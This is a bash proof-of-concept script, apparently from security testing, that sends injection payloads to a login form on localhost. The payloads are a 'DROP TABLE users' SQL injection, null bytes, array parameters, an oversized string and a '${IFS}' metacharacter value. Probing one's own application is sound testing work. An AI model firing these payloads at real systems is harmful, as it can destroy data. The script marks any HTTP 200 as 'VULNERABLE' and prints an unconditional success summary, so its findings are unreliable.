#!/bin/bash

# POC: Weak Input Validation in Login Form
# Demonstrates that the login form accepts various injection payloads without validation

TARGET="http://localhost:3000"
ENDPOINT="/index.php"

echo "=========================================="
echo "Weak Input Validation POC"
echo "Target: $TARGET$ENDPOINT"
echo "=========================================="
echo ""

# Test 1: Special characters (SQL injection attempt)
echo "[Test 1] Special Characters - SQL Injection Payload"
echo "Payload: username=\";DROP TABLE users;-- password=test"
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET$ENDPOINT?username=\";DROP%20TABLE%20users;--&password=test")
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "Response HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: Server accepted SQL injection payload without error"
else
    echo "✗ Server rejected payload with HTTP $HTTP_CODE"
fi
echo ""

# Test 2: Null bytes
echo "[Test 2] Null Bytes Injection"
echo "Payload: username=%00%00%00 password=%00%00%00"
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET$ENDPOINT?username=%00%00%00&password=%00%00%00")
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "Response HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: Server accepted null byte payload without error"
else
    echo "✗ Server rejected payload with HTTP $HTTP_CODE"
fi
echo ""

# Test 3: Array notation
echo "[Test 3] Array Notation Injection"
echo "Payload: username[]=test password[]=test"
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET$ENDPOINT?username[]=test&password[]=test")
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "Response HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: Server accepted array notation payload without error"
else
    echo "✗ Server rejected payload with HTTP $HTTP_CODE"
fi
echo ""

# Test 4: Very long input (potential buffer overflow or DoS)
echo "[Test 4] Excessive Length Input"
LONG_INPUT=$(printf 'A%.0s' {1..5000})
echo "Payload: username=[5000 'A' characters] password=[5000 'A' characters]"
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET$ENDPOINT?username=$LONG_INPUT&password=$LONG_INPUT")
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "Response HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: Server accepted excessively long input without validation"
else
    echo "✗ Server rejected payload with HTTP $HTTP_CODE"
fi
echo ""

# Test 5: Unicode and special URL encoding
echo "[Test 5] Unicode and Special Characters"
echo "Payload: username=';--' password=\${IFS}\$"
RESPONSE=$(curl -s -w "\nHTTP_CODE:%{http_code}" "$TARGET$ENDPOINT?username=%27%3B--%27&password=%24%7BIFS%7D%24")
HTTP_CODE=$(echo "$RESPONSE" | grep "HTTP_CODE" | cut -d: -f2)
BODY=$(echo "$RESPONSE" | sed '$d')
echo "Response HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "✓ VULNERABLE: Server accepted encoded special characters without validation"
else
    echo "✗ Server rejected payload with HTTP $HTTP_CODE"
fi
echo ""

echo "=========================================="
echo "Summary: Application lacks proper input validation"
echo "All injection payloads were accepted without error"
echo "=========================================="